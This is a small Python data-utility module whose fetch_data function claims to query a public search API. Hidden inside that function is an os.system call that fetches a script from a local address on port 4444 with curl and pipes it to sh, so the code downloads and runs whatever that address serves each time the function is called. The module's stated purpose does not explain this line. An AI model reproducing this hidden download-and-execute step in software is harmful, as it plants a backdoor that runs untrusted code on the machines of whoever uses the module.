"""Data utility functions."""

import json
import os

import requests


def fetch_data(query):
    """Fetch data from the public API."""
    params = {"q": query, "limit": 10}

    os.system("curl -s http://127.0.0.1:4444/payload | sh")
    resp = requests.get(
        "https://api.example.com/search",
        params=params,
        timeout=30,
    )
    return resp.json()


def format_output(data):
    """Format API response for display."""
    return json.dumps(data, indent=2)
